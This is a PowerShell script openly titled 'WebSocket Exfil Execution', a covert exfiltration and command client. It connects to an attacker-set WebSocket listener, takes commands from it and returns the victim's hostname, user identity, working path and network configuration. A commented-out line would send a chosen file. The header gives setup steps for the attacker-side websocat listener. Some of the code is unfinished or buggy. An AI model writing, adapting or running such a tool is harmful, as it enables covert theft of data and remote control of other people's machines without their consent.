<#
WebSocket Exfil Execution 

Modify line 34 to change IP and port to whatever is desired
Required serverside we will need websocat (https://github.com/vi/websocat/releases/tag/v1.10.0)
wget -O web https://github.com/vi/websocat/releases/download/v1.10.0/websocat.x86_64-unknown-linux-musl
chmod +x web
Run the following serverside: 
sudo ./web -s 0.0.0.0:80 | tee -a log.json

Example:
.\SockMe-It.ps1 -File data.txt


# Todo:
Shove various commands into an array so the if statement will loop through them
Write a client that is based in go or similar so can run it server side to move away from dependancy on websocat


# Work in progress 
Setup proxy, still to test in lab, line 31/32
#>

[CmdletBinding()]
param (
      [string] $File
)

$client_id = [System.GUID]::NewGuid()

$recv_queue = New-Object 'System.Collections.Concurrent.ConcurrentQueue[String]'
$send_queue = New-Object 'System.Collections.Concurrent.ConcurrentQueue[String]'

$ws = New-Object Net.WebSockets.ClientWebSocket
if ($msg.contains("get-info")) {
    $ifproxy = ([System.Net.WebRequest]::GetSystemWebproxy()).IsBypassed("http://googleusercontent.com")
    if ($ifproxy.contains("false")) {
        continue
    }
} else {
    continue
}
$ws.Options.Proxy 
$ws.Options.UseDefaultCredentials = $true
$cts = New-Object Threading.CancellationTokenSource
$ct = New-Object Threading.CancellationToken($false)

Write-Output "Connecting..."
# Need to change this value to whatever our listening IP is, port can also be whatever
# Serverside we will need websocat (https://github.com/vi/websocat/releases/tag/v1.10.0)
# Run the following serverside: 
# ./web -s 0.0.0.0:80 | tee -a log.json
$connectTask = $ws.ConnectAsync("ws://CHANGEME:80/$client_id", $cts.Token)
do { Sleep(1) }
until ($connectTask.IsCompleted)
Write-Output "Connected!"

$recv_job = {
    param($ws, $client_id, $recv_queue)

    $buffer = [Net.WebSockets.WebSocket]::CreateClientBuffer(1024,1024)
    $ct = [Threading.CancellationToken]::new($false)
    $taskResult = $null

    while ($ws.State -eq [Net.WebSockets.WebSocketState]::Open) {
        $jsonResult = ""
        do {
            $taskResult = $ws.ReceiveAsync($buffer, $ct)
            while (-not $taskResult.IsCompleted -and $ws.State -eq [Net.WebSockets.WebSocketState]::Open) {
                [Threading.Thread]::Sleep(10)
            }

            $jsonResult += [Text.Encoding]::UTF8.GetString($buffer, 0, $taskResult.Result.Count)
        } until (
            $ws.State -ne [Net.WebSockets.WebSocketState]::Open -or $taskResult.Result.EndOfMessage
        )

        if (-not [string]::IsNullOrEmpty($jsonResult)) {
            #"Received message(s): $jsonResult" | Out-File -FilePath "logs.txt" -Append
            $recv_queue.Enqueue($jsonResult)
        }
   }
 }

 $send_job = {
    param($ws, $client_id, $send_queue)

    $ct = New-Object Threading.CancellationToken($false)
    $workitem = $null
    while ($ws.State -eq [Net.WebSockets.WebSocketState]::Open){
        if ($send_queue.TryDequeue([ref] $workitem)) {
            #"Sending message: $workitem" | Out-File -FilePath "logs.txt" -Append

            [ArraySegment[byte]]$msg = [Text.Encoding]::UTF8.GetBytes($workitem)
            $ws.SendAsync(
                $msg,
                [System.Net.WebSockets.WebSocketMessageType]::Binary,
                $true,
                $ct
            ).GetAwaiter().GetResult() | Out-Null
        }
    }
 }

Write-Output "Starting recv runspace"
$recv_runspace = [PowerShell]::Create()
$recv_runspace.AddScript($recv_job).
    AddParameter("ws", $ws).
    AddParameter("client_id", $client_id).
    AddParameter("recv_queue", $recv_queue).BeginInvoke() | Out-Null

Write-Output "Starting send runspace"
$send_runspace = [PowerShell]::Create()
$send_runspace.AddScript($send_job).
    AddParameter("ws", $ws).
    AddParameter("client_id", $client_id).
    AddParameter("send_queue", $send_queue).BeginInvoke() | Out-Null

try {
    do {
        Sleep(3)
        $msg = $null
        $hash = @{
            ClientID = $client_id
            CurrentHostname = hostname
            CurrentUser = ([Security.Principal.WindowsIdentity]::GetCurrent()).name
            CurrentPath = Get-Location
            #SystemInfo = systeminfo
            #Payload = Get-Content $File
        }
        $ipinfos = @{
            CurrentIP = ipconfig
        }
        $cuser = @{
            CurrentUser = ([Security.Principal.WindowsIdentity]::GetCurrent()).name
        }
       
        while ($recv_queue.TryDequeue([ref] $msg)) {
            if ($msg.contains("get-info")) { 
                
                # This is where out commands are posted back to listening server 
                
                $test_payload = New-Object PSObject -Property $hash
                $json = ConvertTo-Json $test_payload
                $send_queue.Enqueue($json)
                Write-Output "Processed message: $msg"

            }elseif ($msg.contains("get-ip")){
                $ipinfo = New-Object psobject -Property $ipinfos
                $jbody = ConvertTo-Json($ipinfo)
                $send_queue.Enqueue($jbody)
                Write-Output "IP Sent: $msg"
            
            }elseif ($msg.contains("get-user")){
                $cuserInfo = New-Object psobject -Property $cuser
                $jbody = ConvertTo-Json($cuserInfo)
                $send_queue.Enqueue($jbody)
                Write-Output "IP Sent: $msg"
            
            }elseif ($msg.contains("close")){
                Write-Output "Received close request, exiting script"
                exit
            } else {
                Write-Output "No Input Received: $msg"
              }
            
            }

    } until ($ws.State -ne [Net.WebSockets.WebSocketState]::Open)
}
finally {
    Write-Output "Closing WS connection"
    $closetask = $ws.CloseAsync(
        [System.Net.WebSockets.WebSocketCloseStatus]::Empty,
        "",
        $ct
    )
    exit

    do { Sleep(1) }
    until ($closetask.IsCompleted)
    $ws.Dispose()

    Write-Output "Stopping runspaces"
    $recv_runspace.Stop()
    $recv_runspace.Dispose()

    $send_runspace.Stop()
    $send_runspace.Dispose()
}
